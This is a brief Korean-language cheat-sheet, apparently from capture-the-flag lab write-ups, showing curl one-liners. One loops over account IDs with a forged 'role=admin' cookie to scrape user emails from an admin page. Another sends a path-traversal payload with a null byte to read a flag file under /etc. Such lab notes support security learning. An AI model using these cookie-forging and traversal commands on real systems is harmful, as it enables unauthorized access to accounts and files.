curl
#
`10.129.95.191/cdn-cgi/login/admin.php는 id 번호로 접근할 수있다. curl명령어로 반복문을 돌려 사용중인 계정정보를 얻을 수 있었다.`

```
for i in {1..100}; do echo "===" $i "==="; curl -s -b "user=34322; role=admin" "http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id="$i | grep --color=no -i email | sed -e 's/<[^>]*>/ /g;s/Access ID  Name//g;s/Email//g;s/^[ ]*//;s/[ ]*$//'; done
```

![image](https://user-images.githubusercontent.com/61821641/149963242-251d0def-b740-489b-aaaf-4c97f859cab9.png)

#
[필터링되는 POST url에 output 받기](https://gitlab.com/sjcode101/write-up/-/blob/main/write-up/thm-fileinc.md)
```
curl -X POST http://10.10.62.101/challenges/chall3.php -d 'method=POST&file=../../../../etc/flag3%00' --output -
```
